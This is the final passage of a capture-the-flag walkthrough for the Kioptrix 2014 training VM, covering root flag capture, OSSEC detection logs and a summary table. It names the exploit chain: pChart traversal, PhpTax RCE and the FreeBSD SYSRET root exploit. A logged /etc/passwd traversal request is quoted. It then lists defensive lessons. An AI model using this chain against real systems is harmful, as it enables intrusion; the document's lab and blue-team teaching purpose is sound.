> **`euid` vs `uid`:** `id` shows `uid` (real user) and `euid` (effective user).
> Permissions are decided by the **effective** ID. Some exploits give you
> `uid=1002 euid=0` — that is a *setuid* style elevation and is enough to read root
> files.

![Kernel exploit giving uid=0](images/07-privesc.png)

---

## 7. Capture the flag

```bash
# cd /root
# ls -al
```

```text
total 88
drwxr-xr-x   2 root  wheel   512 Jan  7 00:57 .
drwxr-xr-x  18 root  wheel  1024 Jan  7 01:42 ..
-rw-r--r--   2 root  wheel   793 Jan  3  2012 .cshrc
-rw-------   1 root  wheel     0 Apr  6  2014 .history
-rw-r--r--   1 root  wheel   151 Jan  3  2012 .k5login
-rw-r--r--   1 root  wheel   299 Jan  3  2012 .login
-rw-------   1 root  wheel     1 Mar 30  2014 .mysql_history
-rw-r--r--   2 root  wheel   256 Jan  3  2012 .profile
----------   1 root  wheel  2611 Apr  3  2014 congrats.txt
-rw-r--r--   1 root  wheel   885 Jan  7 16:49 folderMonitor.log
lrwxr-xr-x   1 root  wheel    25 Mar 29  2014 httpd-access.log -> /var/log/httpd-access.log
-rwxr-xr-x   1 root  wheel   574 Apr  3  2014 lazyClearLog.sh
-rwx------   1 root  wheel  2366 Mar 28  2014 monitor.py
lrwxr-xr-x   1 root  wheel    44 Mar 29  2014 ossec-alerts.log -> /usr/local/ossec-hids/logs/alerts/alerts.log
```

Look at `congrats.txt`: its permissions are `----------`. **That is mode `000` — no
read, write or execute bit for *anyone*, including the owner.** It is a deliberate
final puzzle. Even root is affected when opening a `000` file with some tools, so
fix the mode first:

```bash
# chmod 777 congrats.txt
# cat congrats.txt
```

```text
If you are reading this, it means you got root (or cheated).
Congratulations either way...

Hope you enjoyed this new VM of mine. As always, they are made for the beginner in
mind, and not meant for the seasoned pentester. However this does not mean one
can't enjoy them.

As with all my VMs, besides getting "root" on the system, the goal is to also
learn the basics skills needed to compromise a system. Most importantly, in my mind,
are information gathering & research. Anyone can throw massive amounts of exploits
and "hope" it works, but think about the traffic.. the logs... Best to take it
slow, and read up on the information you gathered and hopefully craft better
more targetted attacks.

For example, this system is FreeBSD 9. Hopefully you noticed this rather quickly.
Knowing the OS gives you any idea of what will work and what won't from the get go.
Default file locations are not the same on FreeBSD versus a Linux based distribution.
Apache logs aren't in "/var/log/apache/access.log", but in "/var/log/httpd-access.log".
It's default document root is not "/var/www/" but in "/usr/local/www/apache22/data".
Finding and knowing these little details will greatly help during an attack.

As a small exercise, look at the logs and see how much noise you generated.
...
For fun, I installed "OSSEC-HIDS" and monitored a few things.
Look at the following files:
/root/folderMonitor.log
/root/httpd-access.log (softlink)
/root/ossec-alerts.log (softlink)

...

Be good...

loneferret
http://www.kioptrix.com

p.s.: Keep in mind, for each "web attack" detected by OSSEC-HIDS, by
default it would've blocked your IP (both in hosts.allow & Firewall) for
600 seconds. I was nice enough to remove that part :)
```

**Flag captured.** ✅

![The congrats.txt flag](images/08-root-flag.png)

---

## 8. Blue-team exercise — how noisy were you?

The author installed **OSSEC-HIDS** (a host-based intrusion detection system) and a
small file-watcher. Do this part; it is the most valuable ten minutes in the box.

```bash
# cat /root/folderMonitor.log
# tail -50 /root/httpd-access.log
# grep -i "pchart\|phptax\|drawimage" /root/ossec-alerts.log
```

```text
2014 Apr 03 12:04:01  MODIFIED /usr/local/www/apache22/data2/phptax/data/rce.php
...
2024 May 02 10:31:07 (Kioptrix2014) 192.168.56.101->/var/log/httpd-access.log
Rule: 31106 fired (level 7) -> "Attempt of Directory Traversal Attack"
Src IP: 192.168.56.10
GET /pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd HTTP/1.1
```

> **What a defender would have seen:**
> - **Rule 31106** is OSSEC's built-in *directory-traversal* signature. Our very
>   first LFI request tripped it at **level 7** (high).
> - `folderMonitor.log` recorded the *creation* of `rce.php` inside PhpTax's data
>   directory — a file that should never be written at runtime.
> - The `403` storm on port 8080 followed by a single `200` after a User-Agent
>   change is a textbook detection pattern.
>
> **And the author's punchline:** in a default OSSEC active-response configuration,
> each detected web attack would have added our IP to `hosts.allow`'s deny list and
> to the firewall for **600 seconds**. Our very first LFI would have locked us out
> for ten minutes. He disabled that for the challenge — in real life, it would have
> stopped us cold.

---

## 9. Summary of vulnerabilities

| # | Vulnerability | Where | How we found it | Impact |
| --- | --- | --- | --- | --- |
| 1 | Information disclosure — HTML comment leaks an internal app path | `index.html` on :80 | View Page Source | Revealed `/pChart2.1.3/` |
| 2 | **Directory traversal / LFI** (CVE-2014-3123 family) | pChart 2.1.3 `examples/index.php?Script=` | `searchsploit pChart` | Read `httpd.conf`, `/etc/passwd` — arbitrary file disclosure |
| 3 | **Access control based on User-Agent** | Apache vhost on :8080 | Reading the leaked `httpd.conf` | Trivially bypassed → exposed PhpTax |
| 4 | **Unauthenticated RCE** | PhpTax 4.11.0915 `drawimage.php?pfilez=` | `searchsploit phptax` | Command execution as `www` (UID 80) |
| 5 | **End-of-life OS with a public local root exploit** | FreeBSD 9.0-RELEASE (CVE-2012-0217, SYSRET) | `uname -a` | `www` → `root` |
| 6 | Flag file with mode `000` | `/root/congrats.txt` | `ls -al` | Deliberate puzzle; teaches permission bits |

## 10. Defensive lessons (blue team)

1. **Patch and inventory third-party libraries.** pChart 2.1.3 shipped in 2013 and
   was vulnerable on arrival. A software bill of materials (SBOM) plus
   `searchsploit`-style checks in CI would have flagged it.
2. **Never trust a `Script`/`page`/`file` parameter.** Canonicalise the path, then
   verify it still starts with the intended directory
   (`realpath()` + prefix check), or use an allow-list of names.
3. **Do not build access control on HTTP headers.** `User-Agent`, `Referer` and
   `X-Forwarded-For` are all attacker-controlled. Use authentication
   (mutual TLS, HTTP basic/digest, an SSO gate) or a network ACL.
4. **Run the web server least-privileged and jail it.** On FreeBSD, put Apache in a
   `jail`; on Linux, use `systemd` sandboxing (`ProtectSystem=strict`,
   `PrivateTmp=yes`). A jailed `www` cannot load kernel exploits.
5. **Do not ship compilers on production servers.** `gcc` being present on a web
   server is what turned "RCE as `www`" into "root in 60 seconds". Remove it.
6. **Retire unsupported operating systems.** FreeBSD 9.0 reached end-of-life in
   December 2012 — over a year *before* this VM was released.
7. **Keep the HIDS and act on it.** OSSEC caught the traversal immediately. The
   value was not in detection but in *response*: enable active-response and the
   attack chain dies at step 3.
8. **Log and alert on file creation inside web-writable directories.**
   `folderMonitor.log` is a 20-line script that spotted the dropped webshell.

---

## 11. References

- VulnHub entry: <https://vulnhub.com/entry/kioptrix-2014-5,62/>
- Kioptrix series: <https://vulnhub.com/series/kioptrix,8/>
- Community writeups consulted:
  - [abatchy — Kioptrix 2014 (#5) Walkthrough](https://www.abatchy.com/2017/01/kioptrix-2014-5-walkthrough-vulnhub.html)
  - [John's InfoSec Ramblings — VulnHub Kioptrix 2014](https://infosecjohn.blog/posts/vulnhub-kioptrix-2014/)
  - [Jack Hacks — VulnHub Kioptrix 5](https://jhalon.github.io/vulnhub-kioptrix5/)
  - [Mohamed Aezzat — Kioptrix Level 5 Walkthrough](https://mohamedaezzat.github.io/posts/kioptrix5/)
  - [David Varghese — VulnHub Kioptrix Level 5](https://blog.davidvarghese.net/posts/vulnhub-kioptrix-level-5/)
  - [InfoSec Institute — Mastering Kioptrix VMs](https://www.infosecinstitute.com/resources/capture-the-flag/kioptrix-vms-challenge-walkthrough/)
- Exploits used:
  - [Exploit-DB 31173 — pChart 2.1.3 Directory Traversal & XSS](https://www.exploit-db.com/exploits/31173)
  - [Exploit-DB 25849 — PhpTax pfilez RCE (Metasploit)](https://www.exploit-db.com/exploits/25849)
  - [Exploit-DB 28718 — FreeBSD 9.0 Intel SYSRET Privilege Escalation](https://www.exploit-db.com/exploits/28718)
- Advisories / background:
  - [CVE-2012-0217 — FreeBSD/NetBSD/OpenBSD Intel SYSRET](https://nvd.nist.gov/vuln/detail/CVE-2012-0217)
  - [FreeBSD Handbook: Apache on FreeBSD](https://docs.freebsd.org/en/books/handbook/network-servers/)
  - [pentestmonkey — Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

---

## 12. Screenshot checklist

- [ ] `images/01-recon.png` — `arp-scan` / `netdiscover` finding the target
- [ ] `images/02-nmap.png` — service scan showing :80 and :8080
- [ ] `images/03-lfi-passwd.png` — the LFI returning `/etc/passwd`
- [ ] `images/04-httpdconf.png` — the `httpd.conf` User-Agent rule
- [ ] `images/05-phptax.png` — PhpTax on :8080 after UA spoofing
- [ ] `images/06-shell.png` — the reverse shell as `www`
- [ ] `images/07-privesc.png` — `SYSRET` exploit output + `id` showing `uid=0`
- [ ] `images/08-root-flag.png` — `congrats.txt`

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md) · [progress](../../docs/PROGRESS.md)._
